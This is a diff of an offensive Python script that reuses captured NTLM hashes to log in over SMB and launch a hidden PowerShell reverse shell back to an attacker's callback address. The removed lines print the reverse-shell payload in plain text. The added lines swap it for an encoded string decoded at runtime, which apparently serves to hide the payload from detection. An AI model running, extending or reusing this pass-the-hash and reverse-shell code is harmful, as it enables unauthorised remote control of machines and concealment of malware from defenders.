@@ -1,5 +1,8 @@
 import argparse
 import io
+import lazyencoder_decoder as ed
+shift_value = 3
+substitution_key = "clave"
 from impacket.smbconnection import SMBConnection
 
 def parse_hash_file(file_path):
@@ -16,7 +19,7 @@ def parse_hash_file(file_path):
 
                 if 'authenticated successfully' in line:
                     parts = line.split()
-                    user_info = parts[2]  # LACHINGONA\gris
+                    user_info = parts[2] 
                     domain, username = user_info.split('\\')
                     print(f"Extracted domain: {domain}, username: {username}")
 
@@ -42,7 +45,7 @@ def parse_hash_file(file_path):
                             print(f"Hash line does not contain '::': {hash_line}")
                     else:
                         print("No subsequent line found for hashes.")
-                        
+
             print(f"Found {len(credentials)} valid credentials")
             return credentials
     except Exception as e:
@@ -70,19 +73,13 @@ def reverse_shell(target_ip, username, domain, lmhash, nthash, callback_ip, call
 
         print(f"Logging in using NTLM hashes username: {username} domain:{domain} lmhash: {lmhash} nthash: {nthash}")
 
-        conn.login(username, '', '192.168.1.87', lmhash_bytes, nthash_bytes)
+        conn.login(username, '', target_ip, lmhash_bytes, nthash_bytes)
 
         # Construye el comando de reverse shell
-        command = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command " \
-                  f"New-Object System.Net.Sockets.TCPClient('{callback_ip}',{callback_port});" \
-                  f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};" \
-                  f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;" \
-                  f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" \
-                  f"$sendback = (iex $data 2>&1 | Out-String );" \
-                  f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';" \
-                  f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" \
-                  f"$stream.Write($sendbyte,0,$sendbyte.Length);" \
-                  f"$stream.Flush()}}; $client.Close()"
+        command2 = "hU93GCXcyNAgeAHyHp9XNQ1Mi25MGJ1LLCouNJPsgwDrYCvoWfGQhVImq3KnQIQtiB1kztVuWkC3ZX9pfaYhkHPWcES0CU0zHpT0QzQtF2hobORiYCUVE2vwEK50RHr7W2KgeEQmM2rmfLE9Qdl7W2KgeEQmM2rmhU9wkM0sMfWngFQqMZ0nUGDiF2lsXD50OikqrIL0haYfiXusM1ywhVYqK11kOUM5kLJcGK0uPA4zBmS1RnY8QCh7KO19R3ktoZvsPQjihXO9GJWngFQqMZ0bZaYfGHunWuq0CVTxWGYzNQUglCFoaf5ACU5srJewPGDrirIjKJq7hxzpNJD0DGD9PHvRXEhhW2QvNZL0NQ1SlCPoRtKhCQIYsAL0EK0sCLJ4bJ5PX0UOGXTbD29ihB5qIZ5VCVYYrKHwgafmQLX5bNAnOBHxXJiwTmUxGB5nWtKxdwH9WFfwELjeQLFkbNJuPh4rAVZ8NS91kH1WbOOdekjlYWqrh2YsGLXkW2xmLAH9WFPgEK5iFrTmyfFfLAkVIbYuNQveRMP3XJpiXEM0oFYyNQf-PHq7HOSzekYnsAPsNR0eRKh0XEm0OkCzM29rfK5lEYc6OCSRVSruZnbsiSM5kLJcIJWnCU5pMpDqfnLnVdFcbOOzBU0zJ3HwiUXmQMBoztWwhVYqZGYzOVQjirFlcEWzOieqppb0fQn7QMB0atAveQ5LpKTgfQjnmC07GJWxeEsqpqObV2atj2IrIX=="
+        command = ed.decode(command2, shift_value, substitution_key)
+
+        command = command.format(callback_ip=callback_ip, callback_port=callback_port)
 
         command_bytes = command.encode('utf-8')
 
